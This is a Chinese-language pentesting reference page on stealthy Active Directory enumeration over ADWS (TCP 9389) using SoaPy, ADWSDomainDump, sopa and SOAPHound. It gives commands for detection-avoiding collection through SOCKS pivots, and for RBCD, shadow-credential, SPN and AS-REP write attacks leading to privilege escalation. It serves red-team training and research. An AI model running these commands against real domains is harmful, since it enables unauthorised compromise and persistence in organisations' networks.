# Active Directory Web Services (ADWS) 枚举与隐蔽收集

{{#include ../../banners/hacktricks-training.md}}

## 什么是 ADWS？

Active Directory Web Services (ADWS) **自 Windows Server 2008 R2 起默认在每个 Domain Controller 上启用**，并监听 TCP **9389**。尽管名称中有 Web，**但并不涉及 HTTP**。相反，该服务通过一组专有的 .NET framing protocols 暴露 LDAP 风格的数据：<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

由于流量被封装在这些二进制 SOAP 帧中，并通过一个不常见的端口传输，**通过 ADWS 进行的枚举比经典 LDAP/389 和 636 流量更不容易被检查、过滤或通过签名检测**。对操作人员来说，这意味着：<sup>[[1]](#references)[[7]](#references)</sup>

* 更隐蔽的侦察——蓝队通常会重点关注 LDAP 查询。
* 可以通过 SOCKS proxy 隧道传输 9389/TCP，从 **非 Windows 主机（Linux、macOS）** 收集数据。
* 可以获取通过 LDAP 能获得的相同数据（用户、组、ACL、schema 等），并执行 **写入**（例如，为 **RBCD** 设置 `msDs-AllowedToActOnBehalfOfOtherIdentity`）。

ADWS 交互通过 WS-Enumeration 实现：每个查询都会以一条 `Enumerate` 消息开始，用于定义 LDAP filter/attributes 并返回一个 `EnumerationContext` GUID；随后一条或多条 `Pull` 消息会逐步获取数据，每次最多返回服务器定义的结果窗口大小。<sup>[[7]](#references)</sup> 上下文大约 30 分钟后会过期，因此工具需要对结果分页，或拆分 filter（按 CN 前缀分别查询），以避免状态丢失。<sup>[[8]](#references)</sup> 请求 security descriptors 时，请指定 `LDAP_SERVER_SD_FLAGS_OID` control 以省略 SACL；否则 ADWS 会直接从其 SOAP 响应中丢弃 `nTSecurityDescriptor` 属性。

> 注意：许多 RSAT GUI/PowerShell 工具也会使用 ADWS，因此相关流量可能与合法的管理活动混在一起。

## SoaPy – 原生 Python 客户端

[SoaPy](https://github.com/logangoins/soapy) 是**完全使用纯 Python 重新实现的 ADWS 协议栈**。它会逐字节构造 NBFX/NBFSE/NNS/NMF 帧，使其能够从类 Unix 系统收集数据，而无需使用 .NET runtime。<sup>[[1]](#references)[[2]](#references)</sup>

### 主要功能

* 支持**通过 SOCKS 进行 proxying**（适用于 C2 implants）。
* 支持与 LDAP `-q '(objectClass=user)'` 相同的精细搜索 filter。
* 提供针对 RBCD、SPN、账户 flags 和 key credentials 的定向**写入**操作。<sup>[[2]](#references)</sup>
* SOAPy 输出可由 **BOFHound** 解析并导入 BloodHound。<sup>[[2]](#references)[[3]](#references)</sup>
* 需要便于人工阅读时，可使用 `--parse` flag 美化时间戳和 `userAccountControl`。<sup>[[2]](#references)</sup>

### 定向收集 flags 与写入操作

SoaPy 内置了一组经过筛选的开关，可通过 ADWS 执行最常见的 LDAP hunting 任务：`--users`、`--computers`、`--groups`、`--spns`、`--asreproastable`、`--admins`、`--constrained`、`--unconstrained`、`--rbcds`，以及用于自定义获取数据的原始 `--query` / `--filter` 参数。它们还可以搭配写入原语使用，例如 `--rbcd <source>`（设置 `msDs-AllowedToActOnBehalfOfOtherIdentity`）、`--spn <service/cn>`（为定向 Kerberoasting 预置 SPN）和 `--asrep`（在 `userAccountControl` 中启用 `DONT_REQ_PREAUTH`）。<sup>[[2]](#references)</sup>

以下示例执行定向 SPN 搜索，仅返回 `samAccountName` 和 `servicePrincipalName`：

```bash
SOAPy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

使用相同的主机/凭据立即 weaponise findings：使用 `--rbcds` dump 已配置 RBCD 的对象，然后执行 `--rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'`，以构建 Resource-Based Constrained Delegation 链（完整的滥用路径请参见 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)）。<sup>[[2]](#references)</sup>

### 安装（operator 主机）

从上游仓库安装当前版本的 SOAPy CLI；在类 Unix 系统中，可执行文件名区分大小写。<sup>[[2]](#references)[[9]](#references)</sup>

```bash
pipx install git+https://github.com/logangoins/SOAPy
```

### 通过 SOCKS pivot 仅凭 Ticket 收集

如果 foothold 提供了 Kerberos ticket，但没有明文密码，请按照 [Pass the Ticket](pass-the-ticket.md) 中的说明，将 `.kirbi` ticket 转换为 `ccache`，然后让 SOAPy 使用该缓存。DC 的 LDAP 服务 ticket 可用于文档中介绍的 SOAPy ADWS 工作流；请通过 pivot 转发 ADWS 和 Kerberos 流量。<sup>[[9]](#references)</sup>

```bash
KRB5CCNAME=ticket.ccache proxychains4 SOAPy -k \
  corp.local/alice@dc01.corp.local -q '(objectClass=computer)'
```

### 通过 ADWS 使用 Shadow Credentials

如果当前主体可以写入目标对象的 `msDS-KeyCredentialLink`，SOAPy 可以通过 ADWS 添加 key credential 并导出对应的 PFX。记录返回的 DeviceID，以便精准移除，而不是清空整个属性。按照 [Shadow Credentials](acl-persistence-abuse/shadow-credentials.md) 中的说明，使用该 PFX 进行 PKINIT。<sup>[[10]](#references)</sup>

```bash
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds add --shadow-target targetuser
# After use, remove only the DeviceID returned by the add action:
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds remove --shadow-target targetuser --device-id '<DEVICE_ID>'
```

## ADWSDomainDump – 通过 ADWS 使用 LDAPDomainDump（Linux/Windows）

* `ldapdomaindump` 的分支，将 LDAP 查询替换为通过 TCP/9389 发送的 ADWS 调用，以减少触发 LDAP-signature 检测。
* 除非传入 `--force`，否则会先检查 9389 端口是否可达（若端口扫描容易引起噪声或被过滤，可跳过此探测）。
* README 中称已针对 Microsoft Defender for Endpoint 和 CrowdStrike Falcon 进行测试，并成功绕过检测。<sup>[[4]](#references)</sup>

### 安装

```bash
pipx install .
```

### 用法

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

典型输出会记录 9389 可达性检查、ADWS 绑定，以及转储的开始和结束：

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - 一个实用的 Golang ADWS 客户端

与 soapy 类似，[sopa](https://github.com/Macmod/sopa) 使用 Golang 实现了 ADWS 协议栈（MS-NNS + MC-NMF + SOAP），并提供命令行 flags 来发起 ADWS 调用，例如：<sup>[[5]](#references)</sup>

* **对象搜索与检索** - `query` / `get`
* **对象生命周期管理** - `create [user|computer|group|ou|container|custom]` 和 `delete`
* **属性编辑** - `attr [add|replace|delete]`
* **账户管理** - `set-password` / `change-password`
* 以及其他功能，如 `groups`、`members`、`optfeature`、`info [version|domain|forest|dcs]` 等。

### 协议映射要点

* 类 LDAP 搜索通过 **WS-Enumeration**（`Enumerate` + `Pull`）发起，支持属性投影、作用域控制（Base/OneLevel/Subtree）和分页。
* 获取单个对象使用 **WS-Transfer** `Get`；修改属性使用 `Put`；删除对象使用 `Delete`。
* 内置对象创建使用 **WS-Transfer ResourceFactory**；自定义对象使用由 YAML 模板驱动的 **IMDA AddRequest**。
* 密码操作使用 **MS-ADCAP** actions（`SetPassword`、`ChangePassword`）。<sup>[[5]](#references)</sup>

### 未认证元数据发现（mex）

ADWS 无需凭据即可提供 WS-MetadataExchange，可用于在进行身份验证前快速确认服务是否暴露：<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### DNS/DC 发现与 Kerberos 目标选择说明

如果省略 `--dc` 并提供 `--domain`，Sopa 可以通过 SRV 记录解析 DC。它会按此顺序查询，并使用优先级最高的目标：<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

在实际操作中，优先使用由 DC 控制的 resolver，以避免在分段环境中出现故障：

* 使用 `--dns <DC-IP>`，让**所有** SRV/PTR/正向查找都通过 DC DNS 进行。
* 当 UDP 被阻止或 SRV 响应较大时，使用 `--dns-tcp`。
* 如果 `--dc` 是 IP，sopa 总会执行**反向 PTR**查找：即使不使用 Kerberos，ADWS 的 `wsa:To` 地址筛选器也需要 FQDN。如果反向区域缺失，请直接提供 DC FQDN。<sup>[[5]](#references)</sup>

示例（IP + Kerberos，通过 DC 强制使用 DNS）：

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### 认证材料选项

除了明文密码，sopa 还支持使用 **NT hashes**、**Kerberos AES keys**、**ccache** 和 **PKINIT certificates**（PFX 或 PEM）进行 ADWS 认证。使用 `--aes-key`、`-c`（ccache）或基于证书的选项时，默认使用 Kerberos。<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### 通过模板创建自定义对象

对于任意对象类，`create custom` 命令会读取映射到 IMDA `AddRequest` 的 YAML 模板：<sup>[[5]](#references)</sup>

* `parentDN` 和 `rdn` 定义容器和相对 DN。
* `attributes[].name` 支持 `cn` 或带命名空间的 `addata:cn`。
* `attributes[].type` 接受 `string|int|bool|base64|hex` 或显式的 `xsd:*`。
* **不要**包含 `ad:relativeDistinguishedName` 或 `ad:container-hierarchy-parent`；sopa 会注入它们。
* `hex` 值会转换为 `xsd:base64Binary`；使用 `value: ""` 可设置空字符串。

## SOAPHound – 高容量 ADWS 收集（Windows）

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) 是一个 .NET 收集器，所有 LDAP 交互均通过 ADWS 进行，并输出兼容 BloodHound v4 的 JSON。它会一次性构建包含 `objectSid`、`objectGUID`、`distinguishedName` 和 `objectClass` 的完整缓存（`--buildcache`），然后在高容量的 `--bhdump`、`--certdump`（ADCS）或 `--dnsdump`（AD 集成 DNS）过程中重复使用该缓存，因此只有约 35 个关键属性会离开 DC。AutoSplit（`--autosplit --threshold <N>`）会按 CN 前缀自动拆分查询，确保大型林中的查询不超过 30 分钟的 EnumerationContext 超时限制。<sup>[[8]](#references)</sup>

在已加入域的操作员 VM 上的典型工作流：

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump --autosplit --threshold 1200 --nolaps -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Export 的 JSON 可直接用于 SharpHound/BloodHound 工作流——下游图谱分析思路请参见 [BloodHound methodology](bloodhound.md)。AutoSplit 让 SOAPHound 在包含数百万个对象的 forest 中也能稳定运行，同时查询次数少于 ADExplorer 风格的快照。

## 隐蔽 AD 收集工作流

以下工作流展示如何通过 ADWS 枚举 **域和 ADCS 对象**，将其转换为 BloodHound JSON，并搜寻基于证书的攻击路径——全程在 Linux 上完成：

1. **将目标网络的 9389/TCP 隧道转发到你的主机**（例如通过 Chisel、Meterpreter、SSH 动态端口转发等）。使用 `proxychains4 SOAPy ...` 通过 SOCKS 转发原始 TCP 客户端（在 `proxychains4.conf` 中配置 SOCKS5 地址）；`HTTPS_PROXY` 不会代理这种非 HTTP 协议。<sup>[[9]](#references)</sup>

2. **收集根域对象：**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **从 Configuration NC 收集与 ADCS 相关的对象：**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority)(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **转换为 BloodHound：**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **将 ZIP 上传**到 BloodHound GUI，并运行 cypher 查询，例如 `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`，以发现证书提权路径（ESC1、ESC8 等）。

### 写入 `msDs-AllowedToActOnBehalfOfOtherIdentity`（RBCD）

拥有目标计算机对象的写入权限后，请使用 SOAPy 的 RBCD action，而不要使用原始安全描述符字符串。此处，`WEBSRV01$` 是受控源，`FILE01$` 是属性将被更改的目标。<sup>[[2]](#references)</sup>

```bash
SOAPy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'
```

继续 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) 中的 Kerberos S4U 链。

## 工具概览

| 用途 | 工具 | 备注 |
|---------|------|-------|
| ADWS 枚举 | [SoaPy](https://github.com/logangoins/soapy) | Python、SOCKS、读/写 |
| 大批量 ADWS 转储 | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET、优先使用缓存、BH/ADCS/DNS 模式 |
| BloodHound 数据导入 | [BOFHound](https://github.com/bohops/BOFHound) | 转换 SoaPy/ldapsearch 日志 |
| 证书失陷 | [Certipy](https://github.com/ly4k/Certipy) | 可通过同一 SOCKS 代理 |
| ADWS 枚举与对象变更 | [sopa](https://github.com/Macmod/sopa) | 用于与已知 ADWS 端点交互的通用客户端，可进行枚举、创建对象、修改属性和更改密码 |



## References

- [1] [SpecterOps – 确保使用 SOAP(y) – 使用 ADWS 进行隐蔽 AD 数据收集的操作指南](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub 仓库](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub 仓库](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub 仓库](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub 仓库](https://github.com/Macmod/sopa)
- [6] [Microsoft – MC-NBFX、MC-NBFSE、MS-NNS、MC-NMF 规范](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – 通过 ADWS 隐蔽枚举 Active Directory 环境](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – 通过 ADWS 收集 Active Directory 数据的 SOAPHound 工具](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
- [9] [SOAPy Wiki – 侦察](https://github.com/logangoins/SOAPy/wiki/Recon)
- [10] [SOAPy Wiki – 后渗透](https://github.com/logangoins/SOAPy/wiki/Post%E2%80%90Exploitation)
{{#include ../../banners/hacktricks-training.md}}
